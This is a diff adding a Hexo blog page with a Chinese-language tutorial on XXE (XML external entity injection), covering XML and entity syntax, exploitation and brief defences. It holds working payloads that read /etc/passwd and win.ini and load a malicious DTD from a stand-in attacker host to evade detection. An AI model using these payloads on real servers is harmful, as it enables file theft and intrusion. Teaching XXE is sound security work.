@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+  
+  <meta name="description" content="一、XXE漏洞1.XXE简介XXE就是XML外部实体注入，当允许引用外部实体时，XML数据在传输中有可能被不法分子修改，导致服务器执行恶意插入的代码，从而导致恶意攻击者可以通过构造恶意内容对任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害 2.XML的概念  XML是可扩展的标记语言，设计用来对数据的传输和存储，结构就是树形结构，由标签构成，有点像HTML语言。 XML是一种非常灵活的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/09/19/XXE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、XXE漏洞1.XXE简介XXE就是XML外部实体注入，当允许引用外部实体时，XML数据在传输中有可能被不法分子修改，导致服务器执行恶意插入的代码，从而导致恶意攻击者可以通过构造恶意内容对任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害 2.XML的概念  XML是可扩展的标记语言，设计用来对数据的传输和存储，结构就是树形结构，由标签构成，有点像HTML语言。 XML是一种非常灵活的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/XXE.assets/image-20230919181903861.png">
+<meta property="og:image" content="http://example.com/XXE.assets/image-20230919181851209.png">
+<meta property="og:image" content="http://example.com/XXE.assets/image-20230919181955103.png">
+<meta property="og:image" content="http://example.com/XXE.assets/image-20230919182026496.png">
+<meta property="og:image" content="http://example.com/XXE.assets/image-20230919182056708.png">
+<meta property="article:published_time" content="2023-09-19T08:31:42.705Z">
+<meta property="article:modified_time" content="2023-09-19T10:29:41.102Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/XXE.assets/image-20230919181903861.png"><meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="wrapper">
+    <header id="header">
+  <h1 id="title">
+    <a href="/">Hexo</a>
+  </h1>
+  <nav>
+    
+    
+      
+      <a class="nav-link" href="/">Home</a>
+    
+      
+        <span class="nav-spacer">×</span>
+      
+      <a class="nav-link" href="/archives">Archives</a>
+    
+      
+        <span class="nav-spacer">×</span>
+      
+      <a class="nav-link" href="/">GitHub</a>
+    
+    
+  </nav>
+</header>
+
+    <div id="content">
+      <article id="post-XXE" class="article article-type-post" itemprop="blogPost" itemscope>
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        <h3 id="一、XXE漏洞"><a href="#一、XXE漏洞" class="headerlink" title="一、XXE漏洞"></a>一、XXE漏洞</h3><p>1.XXE简介<br>XXE就是<strong>XML外部实体注入</strong>，当<strong>允许引用外部实体</strong>时，XML数据在传输中有可能被不法分子修改，导致服务器执行恶意插入的代码，从而导致恶意攻击者可以通过构造恶意内容对任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p>
+<p>2.XML的概念</p>
+<ul>
+<li>XML是可扩展的标记语言，设计用来对数据的传输和存储，<strong>结构就是树形结构，由标签构成</strong>，有点像HTML语言。</li>
+<li>XML是一种非常灵活的语言，没有固定的标签，所有标签都可以自定义</li>
+<li>通常XML被用于信息的传递和记录，因此XML经常被用于充当配置文件</li>
+</ul>
+<p>XML和HTML的区别</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;XML被设计用来传输和存储数据</span><br><span class="line">&gt;HTML被设计用来显示数据</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="二、XML语法解析"><a href="#二、XML语法解析" class="headerlink" title="二、XML语法解析"></a>二、XML语法解析</h3><h4 id="1-XML基础语法"><a href="#1-XML基础语法" class="headerlink" title="1.XML基础语法"></a>1.XML基础语法</h4><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?xml version=’1.0’?&gt;					//声明XML解析器版本来解析</span><br><span class="line">&gt;&lt;person&gt;								//根元素，不一定是person</span><br><span class="line">&gt;&lt;name&gt;test&lt;/name&gt;						//子元素，意思就是name变量的值是test</span><br><span class="line">&gt;&lt;age&gt;20&lt;/age&gt;                           //同理</span><br><span class="line">&gt;&lt;/person&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>简单来说XML的语法中，<strong>标签就是变量名，标签里面的数据就是变量的值</strong></p>
+<p>但是有一个问题，当数据里出现尖括号是，就会造成XML数据的解析错误，如下</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;name&gt;&lt;admin&lt;name&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>因为XML语法中对写法规定了</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;在XML中某些单独字符，如引号&quot; &#x27;和尖括号都是不允许直接出现在XML文档中（不能直接使用上面这种方法来保存单独字符数据），因为XML解析的时候会分辨不清这种输入到底是数值还是标签</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>我们可以使用<strong>XML实体</strong>来保存这些带有特殊字符的数据</p>
+<h4 id="2-XML语法特性"><a href="#2-XML语法特性" class="headerlink" title="2.XML语法特性"></a>2.XML语法特性</h4><p>所有 XML 元素都须有关闭标签<br>XML 标签对大小写敏感<br>XML 必须正确地嵌套<br>XML 文档必须有根元素<br>XML 的属性值需要加引号<br>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p>
+<h4 id="3-XML实体"><a href="#3-XML实体" class="headerlink" title="3.XML实体"></a>3.XML实体</h4><p>实体是一种简单的存储单元，可以理解成我们可以<strong>对XML变量一样进行赋值</strong>，并且在XML文档中不同的地方对他进行引用。实体在XML文档中的文档类型的定义部分（<strong>DTD</strong>）被单独定义描述。</p>
+<h6 id="一、XML的基本结构"><a href="#一、XML的基本结构" class="headerlink" title="一、XML的基本结构"></a>一、XML的基本结构</h6><p>XML的基本结构，由<strong>XML声明、DTD部分、XML部分</strong>，三部分组成</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; ?&gt;		XML声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE person [</span><br><span class="line">&lt;!ENTITY name &quot;john&quot;&gt;		DTD部分</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;person&gt;</span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;			XML部分</span><br><span class="line">&lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/person&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>DTD部分就是用来定义XML文档的合法构建模块的</p>
+<p>DTD部分又可叫根元素，XML部分又可叫子元素。根元素拥有子元素。</p>
+<p>所有元素都可以有文本内容和属性（类似HTML中）</p>
+<h5 id="二、实体"><a href="#二、实体" class="headerlink" title="二、实体"></a>二、实体</h5><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</strong></p>
+<ul>
+<li>实体也分为三种，<strong>一般实体、参数实体，预定义实体</strong>（都是属于内部实体）</li>
+<li>实体可在内部或外部进行声明</li>
+</ul>
+<p><strong>1.内部实体和外部实体</strong></p>
+<p>内部实体，实体的值来源于内部，外部实体顾名思义就是引用外部的值，两者的写法也差不多，外部实体仅仅是多引用了一个SYSTEM。</p>
+<table>
+<thead>
+<tr>
+<th>实体类型</th>
+<th>内部实体</th>
+<th>外部实体</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>语法</td>
+<td><!ENTITY 实体名称 ”实体的值"></td>
+<td><!ENTITY 实体名称 SYSTEM "URI/URL"></td>
+</tr>
+<tr>
+<td>例子</td>
+<td><!ENTITY writer "Bill F ates"></td>
+<td><!ENTITY writer SYSTEM "DTD1.dtd"></td>
+</tr>
+<tr>
+<td>XML例子</td>
+<td><author>&writer;</author></td>
+<td><author>&writer;</author></td>
+</tr>
+</tbody></table>
+<p>注意：引入外部的DTD文件时，dtd文件中存放的就是xml代码，并且引用外部实体的时候还可以使用各种伪协议，而不是仅限于http协议。</p>
+<p>内部实体和外部实体的代码区别</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0”?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">&lt;!ELEMENT note (name)&gt;</span><br><span class="line">&lt;!ENTITY hack3r “hu3sky”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;hack3r;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0”?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY  name SYSTEM “http://xx.com/aa.dtd”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>总结：内部实体就相当于自己编写的DTD内容，而外部实体就相当于引入外部的DTD内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXE漏洞就存在于外部实体中，我们将恶意代码写入DTD文件中再通过外部实体引入</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.漏洞演示</strong></p>
+<p>​	XML漏洞就是XML外部实体注入。引入外部实体方式有很多种，比如：实体<strong>不仅能用来存储指定数值，还能从本地文件或者远程文件中调用相关的数据作为后续实体引用</strong>。如外部实体就是其中之一。</p>
+<p>举例两个简单的外部实体攻击例子</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XML内容：</span><br><span class="line">	&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE a [</span><br><span class="line">		&lt;!ENTITY % d SYSTEM “file:///etc/passwd”&gt;</span><br><span class="line">        %d;</span><br><span class="line">	]&gt;</span><br><span class="line">	&lt;c&gt;%d;&lt;/c&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>此时c变量读取的值便是&#x2F;etc&#x2F;passwd文件的内容</p>
+<p>但这种方法会涉及到敏感内容</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XML内容</span><br><span class="line">	&lt;?xml version=’1.0’?&gt;</span><br><span class="line">	&lt;!DOCTYPE a [</span><br><span class="line">			&lt;!ENTITY % d SYSTEM “http://abc.com/evil.dtd”&gt;</span><br><span class="line">	%d;</span><br><span class="line">	]&gt;</span><br><span class="line">	&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"> </span><br><span class="line">Evil.dtd内容</span><br><span class="line"> </span><br><span class="line">	&lt;!ENTITY b SYSTEM “file://etc/passwd”&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>该方法通过引入外部的DTD文件，而文件中同样时读取敏感文件的恶意代码，但这样的方式被检测的可能性会被大大降低</p>
+<p><strong>3.判断是否存在XXE漏洞</strong></p>
+<ul>
+<li><strong>有回显时（文件读取、内网探测）</strong></li>
+</ul>
+<p>看它是否能解析XML数据，所以我们直接传入一段XML代码看它是否能解析</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY hacker &quot;test&quot;&gt; ]&gt; </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>: 该代码就是给name变量赋一个test的值，把代码放入测试位置进行测试</p>
+<p>如果得到test值说明可能存在XXE漏洞</p>
+<ul>
+<li><p><strong>无回显时（查看受攻击机的服务器日志、通过DNSlog平台查看是否进行查询、burp插件进行验证）</strong></p>
+<p><img src="/XXE.assets/image-20230919181903861.png" alt="image-20230919181903861"></p>
+<p><img src="/XXE.assets/image-20230919181851209.png" alt="image-20230919181851209"></p>
+<p><img src="/XXE.assets/image-20230919181955103.png" alt="image-20230919181955103"></p>
+<p><img src="/XXE.assets/image-20230919182026496.png" alt="image-20230919182026496"></p>
+<p><img src="/XXE.assets/image-20230919182056708.png" alt="image-20230919182056708"></p>
+</li>
+</ul>
+<p><strong>4.漏洞利用</strong></p>
+<p>外部实体引用可以使用的协议</p>
+<table>
+<thead>
+<tr>
+<th>语言-&gt;</th>
+<th>libxml2</th>
+<th>PHP</th>
+<th>JAVA</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>协议</td>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td></td>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td></td>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>php</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>data</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>glod</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>phar</td>
+<td>mailto</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>1.直接外部实体注入</strong></p>
+<p>直接外部实体注入，就是通过协议直接执行恶意命令</p>
+<p>因为我是windows主机，这里我们以<strong>file协议</strong>来读取<strong>c:&#x2F;windows&#x2F;win.ini</strong>配置文件的内容，xml代码如下(注意这里的路径需要改变写法，不然会受到转义的影响)</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY hacker SYSTEM &quot;file:///c://windows//win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>2.间接外部实体注入</strong></p>
+<p>将恶意代码写在DTD文件中，在引入DTD文件</p>
+<ol>
+<li><p>构造外部dtd文件</p>
+<p>创建一个xxx.dtd文件，内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hacker SYSTEM &quot;file:///c://windows//win.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>让两台机器可以相互连接</p>
+</li>
+<li><p>构造XML代码</p>
+<p>引用外部实体的XML代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE name </span><br><span class="line">    [ &lt;!ENTITY % a SYSTEM &quot;http:///IP地址/xxx.dtd&quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;hacker&gt;%a;&lt;/hacker&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="三-漏洞防范"><a href="#三-漏洞防范" class="headerlink" title="三.漏洞防范"></a>三.漏洞防范</h3><p>针对于XXE漏洞修复的就以下两点：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.禁止使用外部实体，例如libxml disable_entity_loader(true)</span><br><span class="line">2.过滤用户提交的XML数据，防止出现非法内容</span><br></pre></td></tr></table></figure></blockquote>
+
+      
+    </div>
+    
+    
+    
+  </div>
+</article>
+
+  
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2023/09/21/CSRF/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/08/29/%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E4%BF%AE%E6%94%B9/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+      </div>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+    </div>
+  </div>
+  
+
+
+
+
+<div id="settings-container">
+  <div id="dark-mode">dark</div>
+  <div id="sans-font">sans</div>
+</div>
+<script type="text/javascript">
+let d=document,r=d.documentElement.style,f=r.setProperty.bind(r),l=localStorage,s=l.getItem('s')||(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches),n=l.getItem('n'),m=d.getElementById("dark-mode"),b=()=>{f('--bg-color','#fafafa');f('--code-bg-color','#f4f4f4');f('--text-color','#212121');f('--secondary-color','#808080');f('--tertiary-color','#b0b0b0');f('--link-color','#b5c8cf');f('--link-hover-color','#618794');f('--link-bg-color','#dae4e7');f('--selection-color','#dae4e7');m.innerHTML="dark"},c=()=>{f('--bg-color','#212121');f('--code-bg-color','#292929');f('--text-color','#fff');f('--secondary-color','#c0c0c0');f('--tertiary-color','#6e6e6e');f('--link-color','#4d6b75');f('--link-hover-color','#96b1bb');f('--link-bg-color','#5d828e');f('--selection-color','#acc1c9');m.innerHTML="light"},o=d.getElementById("sans-font"),e=()=>{f('--body-stack','"Lora", "Georgia", "Times New Roman", serif');o.innerHTML="sans"},g=()=>{f('--body-stack','"Lato", "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "Verdana", sans-serif');o.innerHTML="serif"};m.onclick=()=>{if(s==2){s=1;l.setItem('s',s);c()}else{s=2;l.setItem('s',s);b()}};o.onclick=()=>{if(n==2){n=1;l.setItem('n',n);g()}else{n=2;l.setItem('n',n);e()}};if(!s){s=2;l.setItem('s',2)};if(s==1){c()};if(!n){n=2;l.setItem('n',2)};if(n==1){g()};
+</script>
+
+
+
+
+</body>
+</html>
